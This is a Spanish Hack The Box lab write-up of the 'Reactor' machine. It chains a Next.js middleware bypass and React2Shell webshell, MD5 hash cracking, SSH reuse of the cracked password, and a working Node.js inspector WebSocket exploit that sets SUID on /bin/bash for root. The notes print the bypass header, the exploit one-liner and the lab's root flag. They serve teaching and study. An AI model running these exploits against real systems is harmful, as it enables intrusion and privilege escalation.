---
tags:
- Máquinas y prácticas
---

# Sesion Reactor HTB

**REACTOR**

Hack The Box · Writeup de maquina

Chema Marmol · Evolve Academy · 4 de julio de 2026

| **Dato** | **Valor** |
| --- | --- |
| IP de la maquina (target) | 10.129.245.214 |
| IP de Kali (VPN tun0) | 10.10.15.138 |
| Sistema operativo objetivo | Ubuntu Linux 24.04 |
| Servicios expuestos | 22/tcp SSH · 3000/tcp Next.js |
| Dificultad estimada | Media |
| CVE principal explotado | CVE-2025-29927 — Next.js Middleware Bypass |
| Herramienta de explotacion | React2Shell (github.com/xalgord/React2Shell) |
| Vector de privesc | Node.js Inspector --inspect en produccion (puerto 9229) |
| Flag de user | Obtenida — usuario engineer |
| Flag de root | badf869c93839ef9fd15b4576d17ac45 |

| Estos apuntes documentan el kill chain completo de la maquina Reactor de Hack The Box. El entorno es un laboratorio autorizado con fines educativos. Todo el contenido esta orientado al aprendizaje ofensivo en entornos controlados. |
| --- |

# **1. Objetivos de la sesion**

En esta maquina se trabajan los siguientes objetivos de aprendizaje:

| **Objetivo** | **Tecnica / concepto** |
| --- | --- |
| Identificar el framework de una aplicacion web sin herramientas de fuzzing | Wappalyzer — fingerprinting pasivo |
| Explotar una vulnerabilidad de middleware en Next.js | CVE-2025-29927 — bypass de autenticacion |
| Obtener ejecucion remota de comandos en una app Node.js | React2Shell — webshell HTTP sobre Next.js |
| Extraer y crackear credenciales almacenadas en SQLite | Hashcat — ataque de diccionario MD5 |
| Moverse lateralmente a traves de credenciales reutilizadas | SSH con contrasena crackeada |
| Escalar privilegios explotando Node.js Inspector en produccion | WebSocket CDP — Runtime.evaluate como root |

# **2. Conceptos clave**

## **CVE-2025-29927 — Next.js Middleware Bypass**

Next.js utiliza un sistema de middleware para proteger rutas de la API. Internamente, cuando una peticion ya ha pasado por el middleware, Next.js le anade el header x-middleware-subrequest para no procesarla dos veces. El fallo consiste en que si un atacante externo envia ese mismo header manualmente, el servidor lo acepta sin validar el origen y omite el middleware completamente, dando acceso directo a cualquier ruta protegida.

| El header que bypasea el middleware es: x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware. El numero de repeticiones depende de la version de Next.js (5 niveles para versiones 14.x/15.x). |
| --- |

## **Node.js Inspector — Puerto 9229**

El flag --inspect de Node.js activa el Chrome DevTools Protocol (CDP), un protocolo de depuracion remota que escucha conexiones WebSocket. Cuando se activa en produccion corriendo como root, cualquier proceso local puede conectarse al puerto 9229 y ejecutar JavaScript arbitrario dentro de ese proceso con permisos de root. Es equivalente a dejar una consola de root abierta en localhost.

| Peligro critico: NUNCA usar --inspect ni --inspect-brk en produccion. Si es necesario depurar, hacerlo en entornos aislados, con autenticacion adicional y nunca como root. |
| --- |

## **WebSocket — Protocolo de comunicacion con el Inspector**

El protocolo CDP usa WebSocket como transporte. Los mensajes son objetos JSON con campos id, method y params. Para este exploit hay dos detalles tecnicos importantes:

| **Detalle** | **Explicacion** |
| --- | --- |
| require() no es global en el inspector | En el contexto del inspector de Node, require() no existe como variable global. Hay que acceder a el via process.mainModule.require(). |
| Limite de 125 bytes en frames WebSocket | La cabecera estandar de un frame WebSocket solo admite payloads de hasta 125 bytes. Para payloads mas largos (como el JSON del Runtime.evaluate) hay que usar la cabecera extendida: byte 0x81, byte 0xfe, 2 bytes de longitud en big-endian. |
| Orden de mensajes CDP | Hay que enviar Runtime.enable antes de Runtime.evaluate. Sin este paso, el evaluate puede ser ignorado. |

## **SUID en /bin/bash — Escalada local**

El bit SUID (Set User ID) en un binario hace que se ejecute con los permisos de su propietario, no con los del usuario que lo invoca. Si root pone SUID en /bin/bash y un usuario normal lo ejecuta con bash -p, bash hereda euid=0 (root) y tiene acceso total al sistema. El flag -p le indica a bash que mantenga los privilegios elevados en vez de descartarlos al arrancar.

# **3. Kill Chain — Vision general**

| **1. Reconocimiento — Nmap detecta Next.js en puerto 3000** |
| --- |
| ↓ |
| **2. Identificacion — Wappalyzer confirma Next.js como framework** |
| ↓ |
| **3. Explotacion — React2Shell aplica CVE-2025-29927 → shell como node** |
| ↓ |
| **4. Enumeracion interna — reactor.db expone hashes MD5 de usuarios** |
| ↓ |
| **5. Crackeo — Hashcat rompe el hash de engineer: reactor1** |
| ↓ |
| **6. Movimiento lateral — SSH como engineer (shell estable)** |
| ↓ |
| **7. Privesc — Node Inspector puerto 9229 → chmod +s bash → euid=0 (root)** |

# **4. Desarrollo tecnico paso a paso**

| **Paso 1** | **Reconocimiento con Nmap** |
| --- | --- |

Escaneo completo de todos los puertos TCP con deteccion de versiones y scripts:

| nmap -sCV -p- -oA reactor 10.129.245.214 -vvv |
| --- |

Resultado del escaneo:

| **Puerto** | **Estado** | **Servicio** | **Detalle** |
| --- | --- | --- | --- |
| 22/tcp | open | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 |
| 3000/tcp | open | HTTP | Next.js — ReactorWatch Core Monitoring System |

| El puerto 3000 devuelve headers HTTP con X-Powered-By: Next.js y x-nextjs-cache. El titulo de la pagina es ReactorWatch | Core Monitoring System. Es el unico vector de entrada ademas del SSH. |
| --- |

| **Paso 2** | **Identificacion del framework con Wappalyzer** |
| --- | --- |

Sin lanzar fuzzing ni herramientas activas adicionales, se abre la URL en el navegador y se usa la extension Wappalyzer para identificar el stack tecnologico de la aplicacion.

| **Tecnologia** | **Valor detectado** |
| --- | --- |
| Framework frontend/backend | Next.js |
| Runtime | Node.js |
| Servidor web | Next.js built-in HTTP server |

| Wappalyzer es una extension de navegador (Chrome/Firefox) que analiza pasivamente los headers HTTP, el HTML y los scripts de la pagina para identificar el framework, CMS, librerias JS, servidor web y otras tecnologias. No genera trafico activo adicional. Es el primer paso de fingerprinting cuando se trabaja con aplicaciones web. |
| --- |

Con Next.js identificado, se busca si existe un exploit publico para la version en uso. Se encuentra que la aplicacion es vulnerable a CVE-2025-29927 y se localiza React2Shell como herramienta de explotacion.

| **Paso 3** | **Explotacion con React2Shell — CVE-2025-29927** |
| --- | --- |

### **Que es React2Shell**

React2Shell es una herramienta de codigo abierto disponible en GitHub (github.com/xalgord/React2Shell) que automatiza la explotacion de aplicaciones Next.js vulnerables al CVE-2025-29927. La herramienta: identifica que rutas de la API estan protegidas por middleware, aplica el bypass enviando el header x-middleware-subrequest, localiza un endpoint vulnerable a inyeccion de comandos, y presenta una interfaz de pseudo-shell interactiva para ejecutar comandos en el servidor.

| git clone https://github.com/xalgord/React2Shell  cd React2Shell  python3 react2shell.py -u http://10.129.245.214:3000/ |
| --- |

La herramienta se conecta, aplica el bypass y abre la pseudo-shell:

| ╔════════════════════════════════════════════════════════════╗  ║ React2Shell - Next.js RCE Shell ║  ║ Target: http://10.129.245.214:3000/ ║  ╚════════════════════════════════════════════════════════════╝  ubuntu@target:~$ whoami  node |
| --- |

| Importante — modelo de la webshell: React2Shell implementa una webshell HTTP. Cada comando es una peticion HTTP independiente — no es una shell interactiva real. No funcionan: pty (python3 -c pty.spawn), sudo con contrasena, process.exit(), ni comandos que bloqueen esperando input. Usarla solo para enumerar y extraer credenciales antes de pasar a SSH. |
| --- |

| **Paso 4** | **Enumeracion interna desde la webshell** |
| --- | --- |

### **Explorar el directorio /opt**

| ls -la /opt/  # drwxr-xr-x node node reactor-app  # drwxr-xr-x root root uptime-monitor <-- propiedad de root |
| --- |

| **Directorio** | **Propietario** | **Contenido relevante** |
| --- | --- | --- |
| /opt/reactor-app | node | Aplicacion Next.js — contiene reactor.db y .env |
| /opt/uptime-monitor | root | Worker de monitorizacion — corre como root con --inspect |

### **Extraer hashes de la base de datos SQLite**

| cat /opt/reactor-app/reactor.db |
| --- |

La base de datos SQLite expone la tabla users con hashes MD5 sin salt:

| **Usuario** | **Hash MD5** | **Rol** | **Email** |
| --- | --- | --- | --- |
| engineer | 39d97110eafe2a9a68639812cd271e8e | operator | engineer@reactor.htb |
| admin | a203b22191d744a4e70ada5c101b17b8 | administrator | admin@reactor.htb |

| Almacenar contrasenas con MD5 sin salt es una vulnerabilidad critica. MD5 es una funcion de hash de proposito general, no de seguridad de contrasenas. Sin salt, hashes identicos producen siempre el mismo resultado, lo que hace posible los ataques de diccionario y las tablas rainbow. La funcion correcta es bcrypt, argon2 o scrypt. |
| --- |

### **Leer el fichero .env**

| cat /opt/reactor-app/.env |
| --- |

| **Variable** | **Valor** |
| --- | --- |
| DB\_PATH | /opt/reactor-app/reactor.db |
| DB\_TYPE | sqlite3 |
| SENSOR\_API\_KEY | rw\_sk\_7f8a9b2c3d4e5f6g7h8i9j0k |
| ALERT\_WEBHOOK | https://alerts.internal.reactor.htb/webhook |
| NODE\_ENV | production |

### **Identificar el proceso peligroso de root**

| ps aux | grep node | grep -v grep |
| --- |

| root 1419 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js |
| --- |

| Vector de escalada identificado: el proceso de root corre con --inspect=127.0.0.1:9229. Esto significa que el debugger de Node.js esta activo y accesible localmente. Cualquier usuario del sistema puede conectarse al puerto 9229 y ejecutar codigo JavaScript dentro del proceso de root. |
| --- |

| **Paso 5** | **Crackeo del hash MD5 con Hashcat** |
| --- | --- |

Desde Kali, se crea el fichero con el hash de engineer y se lanza Hashcat en modo MD5 (-m 0):

| echo '39d97110eafe2a9a68639812cd271e8e' > hash\_engineer.txt  hashcat -m 0 hash\_engineer.txt /usr/share/wordlists/rockyou.txt |
| --- |

Resultado — crackeado en menos de 1 segundo:

| 39d97110eafe2a9a68639812cd271e8e:reactor1 |
| --- |

| **Usuario** | **Contrasena** | **Tiempo de crackeo** | **Metodo** |
| --- | --- | --- | --- |
| engineer | reactor1 | < 1 segundo | Hashcat -m 0 + rockyou.txt |

Se intento tambien crackear el hash del admin (a203b22191d744a4e70ada5c101b17b8) pero no aparecio en rockyou.txt. No fue necesario para completar la maquina.

| **Paso 6** | **Movimiento lateral — SSH como engineer** |
| --- | --- |

Con la contrasena crackeada se accede por SSH. El puerto 22 estaba abierto desde el reconocimiento inicial:

| ssh engineer@10.129.245.214  # Password: reactor1 |
| --- |

| id  # uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)  cat ~/user.txt  # [FLAG DE USER] |
| --- |

| Con SSH obtenemos una shell completamente interactiva, estable y persistente. Todos los problemas de la webshell HTTP desaparecen. Es el momento de enumerar vectores de escalada de privilegios con tranquilidad. |
| --- |

Se comprueba el grupo lxd, que normalmente es un vector de escalada. En esta maquina LXD no estaba instalado (intentaba descargarlo via snap sin conexion a internet). Vector descartado.

| **Paso 7** | **Escalada de privilegios — Node.js Inspector (puerto 9229)** |
| --- | --- |

### **Confirmar que el inspector esta activo**

| curl -s http://127.0.0.1:9229/json/version  # {"Browser": "node.js/v20.20.2", "Protocol-Version": "1.1"}  curl -s http://127.0.0.1:9229/json | grep webSocketDebuggerUrl  # "webSocketDebuggerUrl": "ws://127.0.0.1:9229/21594279-61c1-4b34-ae7e-edcb62a228cf" |
| --- |

El UUID de sesion del inspector es: 21594279-61c1-4b34-ae7e-edcb62a228cf. Este UUID puede cambiar si el servicio se reinicia.

### **El exploit — WebSocket CDP artesanal**

Se escribe un exploit en Node.js que: abre una conexion WebSocket al inspector, habilita el dominio Runtime con Runtime.enable, y envia Runtime.evaluate con la expresion que pone el bit SUID en bash ejecutandose como root.

| Tres requisitos tecnicos del exploit que hay que conocer: (1) Runtime.enable debe enviarse ANTES de Runtime.evaluate. (2) require() no existe en el contexto del inspector — usar process.mainModule.require(). (3) Payloads de mas de 125 bytes necesitan cabecera WebSocket extendida (bytes 0x81, 0xfe, longitud en 2 bytes big-endian). |
| --- |

| # Sustituir EL-UUID por el UUID obtenido con curl .../json  node -e 'const net=require("net"),c=require("crypto");  const P="/EL-UUID";  const k=c.randomBytes(16).toString("base64");  const s=net.connect(9229,"127.0.0.1",()=>{  s.write(`GET ${P} HTTP/1.1\r\nHost: 127.0.0.1:9229\r\n  Upgrade: websocket\r\nConnection: Upgrade\r\n  Sec-WebSocket-Key: ${k}\r\nSec-WebSocket-Version: 13\r\n\r\n`)  });  function F(o){  const m=Buffer.from(JSON.stringify(o));  const mk=c.randomBytes(4),mx=Buffer.alloc(m.length);  for(let i=0;i<m.length;i++)mx[i]=m[i]^mk[i%4];  let h;  if(m.length<126){ h=Buffer.from([0x81,0x80|m.length]) }  else{ h=Buffer.alloc(4);h[0]=0x81;h[1]=0xfe;h.writeUInt16BE(m.length,2) }  return Buffer.concat([h,mk,mx])  }  let hs=0;  s.on("data",()=>{  if(hs)return; hs=1;  s.write(F({id:1,method:"Runtime.enable"}));  s.write(F({id:3,method:"Runtime.evaluate",  params:{expression:"process.mainModule.require(\'child\_process\').execSync(\'chmod +s /bin/bash\')"}}));  });  setTimeout(()=>process.exit(),4000)' |
| --- |

### **Verificar el SUID y leer la flag de root**

| ls -la /bin/bash  # -rwsr-sr-x 1 root root 1446024 Mar 31 2024 /bin/bash  # ^^^  # La 's' confirma que el bit SUID esta activo  /bin/bash -p -c 'id; cat /root/root.txt'  # uid=1000(engineer) gid=1000(engineer) euid=0(root) egid=0(root) groups=0(root),...  # badf869c93839ef9fd15b4576d17ac45 |
| --- |

| euid=0 confirma ejecucion como root. /bin/bash -p hereda el euid del propietario del binario (root) gracias al bit SUID. El flag -p le indica a bash que NO descarte los privilegios elevados al arrancar. Maquina completamente comprometida. |
| --- |

# **5. Herramientas utilizadas en la sesion**

| **Herramienta** | **Objetivo** | **Fase** | **Comando o uso visto** | **Nivel** | **Notas** |
| --- | --- | --- | --- | --- | --- |
| Nmap | Descubrir puertos y servicios | Reconocimiento | nmap -sCV -p- IP | Recurrente | Detecto Next.js en puerto 3000 |
| Wappalyzer | Fingerprinting pasivo del framework web | Reconocimiento | Extension navegador — clic en el icono | Introducida | Identifico Next.js → busqueda de CVEs dirigida |
| React2Shell | RCE via CVE-2025-29927 en Next.js | Explotacion inicial | python3 react2shell.py -u URL | Introducida | github.com/xalgord/React2Shell — shell como node |
| curl | Probar endpoints HTTP y CDP | Enumeracion/Explotacion | curl -s http://127.0.0.1:9229/json | Recurrente | Usado para verificar inspector activo y obtener UUID |
| Hashcat | Crackear hashes MD5 | Post-explotacion | hashcat -m 0 hash.txt rockyou.txt | Practicada | Hash de engineer crackeado en menos de 1 segundo |
| SSH | Shell interactiva estable | Movimiento lateral | ssh engineer@IP | Recurrente | Contrasena reactor1 obtenida del crackeo |
| Node.js exploit WebSocket | Explotar Node Inspector via CDP | Escalada de privilegios | node -e 'exploit artesanal WebSocket CDP' | Introducida | Runtime.enable + Runtime.evaluate + process.mainModule.require |
| /bin/bash -p | Heredar euid=0 via SUID | Escalada de privilegios | /bin/bash -p -c 'comando' | Introducida | Solo funciona si bash tiene el bit SUID activo |

# **6. Errores comunes y buenas practicas**

| **Error comun** | **Causa** | **Solucion** |
| --- | --- | --- |
| Usar pty o comandos interactivos en la webshell | React2Shell es HTTP — no hay TTY real | Escalar a SSH antes de avanzar |
| require() no definido en el inspector | require no es global en el contexto del inspector CDP | Usar process.mainModule.require() |
| Frame WebSocket invalido para payloads >125 bytes | La cabecera estandar solo admite hasta 125 bytes | Usar cabecera extendida: 0x81, 0xfe, 2 bytes de longitud |
| Runtime.evaluate ignorado sin Runtime.enable | El dominio Runtime no esta habilitado | Enviar Runtime.enable primero |
| UUID del inspector cambia entre intentos | El servicio se reinicia con Restart=on-failure | Siempre hacer curl .../json antes de lanzar el exploit |
| MD5 considerado seguro por ser hash | MD5 no es una funcion de hash de contrasenas | Usar bcrypt, argon2 o scrypt con salt para contrasenas |

# **7. Conexion con sesiones anteriores**

Esta maquina consolida y amplia tecnicas vistas en sesiones previas:

| **Tecnica / herramienta** | **Sesion previa** | **Nuevo en esta sesion** |
| --- | --- | --- |
| Nmap reconocimiento | Todas las sesiones anteriores | Sin cambios — uso habitual |
| Hashcat crackeo de hashes | Sesiones de post-explotacion con John/Hashcat | Primer uso contra hashes MD5 de base de datos SQLite de aplicacion web |
| SSH movimiento lateral | Machines Responder, Archetype y otras | Reutilizacion de contrasena crackeada desde hash de base de datos |
| Enumeracion de procesos con ps aux | Sesiones de privesc en Linux | Nuevo vector: --inspect en proceso de root |
| Webshell HTTP | Sesiones de explotacion web (Bashed, Three) | Primer uso de React2Shell como generador de webshell automatico via CVE |
| Escalada via configuracion incorrecta | Varias sesiones de privesc | Nuevo vector: debugger de Node.js en produccion como root |

# **8. Resumen del ataque**

| **Vector** | **Vulnerabilidad** | **Impacto** |
| --- | --- | --- |
| Aplicacion web Next.js | CVE-2025-29927 — bypass de middleware de autenticacion | RCE como usuario node via React2Shell |
| Base de datos SQLite | Hashes MD5 sin salt — contrasena en rockyou.txt | Credenciales de engineer en texto claro (reactor1) |
| Configuracion de servicio | Node.js --inspect en produccion corriendo como root | Ejecucion de codigo como root — SUID bash — flag de root |

| La combinacion de tres vulnerabilidades independientes (bypass de middleware, credenciales debiles y mal configuracion de servicio) convierte una aplicacion de monitorizacion en un vector de comprension total del sistema. |
| --- |

# **9. Checklist de repaso**

| **#** | **Pregunta de control** |
| --- | --- |
| 1 | He escaneado todos los puertos TCP con -p- antes de asumir que no hay mas servicios? |
| 2 | He usado Wappalyzer para identificar el framework antes de buscar CVEs? |
| 3 | Existe algun exploit publico en GitHub para el framework o version detectada? |
| 4 | La shell obtenida es interactiva o es una webshell HTTP? He escalado a SSH antes de avanzar? |
| 5 | He revisado /opt, todos los ficheros .env y las bases de datos locales? |
| 6 | He ejecutado ps aux | grep root para buscar procesos peligrosos corriendo como root? |
| 7 | Hay algun proceso de root con --inspect, --allow-root u otras opciones de depuracion? |
| 8 | He confirmado el UUID del inspector con curl .../json antes de lanzar el exploit? |
| 9 | El exploit WebSocket envia Runtime.enable antes de Runtime.evaluate? |
| 10 | Estoy usando process.mainModule.require() y no require() en el contexto del inspector? |
| 11 | El payload del frame WebSocket supera 125 bytes? Si es asi, uso cabecera extendida? |
| 12 | Verifico con ls -la /bin/bash que la 's' esta presente antes de ejecutar bash -p? |

# **10. Actualizacion del registro de herramientas**

| Herramientas nuevas detectadas en esta sesion que deben anadirse al registro del proyecto. |
| --- |

| **Herramienta** | **Estado anterior** | **Estado nuevo** | **Motivo** |
| --- | --- | --- | --- |
| Wappalyzer | No registrada | Introducida | Primera vez — extension de fingerprinting pasivo de tecnologias web. Identifico Next.js en Reactor. |
| React2Shell | No registrada | Introducida | Primera vez — exploit publico para CVE-2025-29927. Automatiza RCE en Next.js vulnerable. |
| Node.js exploit WebSocket | No registrada | Introducida | Primera vez — exploit artesanal de Node Inspector via WebSocket CDP. Requiere: Runtime.enable + process.mainModule.require + cabecera extendida. |
| /bin/bash -p (SUID) | No registrada | Introducida | Primera vez — ejecucion de bash heredando euid=0 tras poner bit SUID con chmod +s /bin/bash. |
| curl (uso CDP) | Recurrente | Recurrente | Nuevo uso: verificacion de inspector Node.js activo y obtencion de UUID de sesion CDP. |

| Niveles actualizados: Wappalyzer (Introducida), React2Shell (Introducida), Node.js exploit WebSocket (Introducida), /bin/bash -p SUID (Introducida), curl (Recurrente — uso CDP anadido). |
| --- |
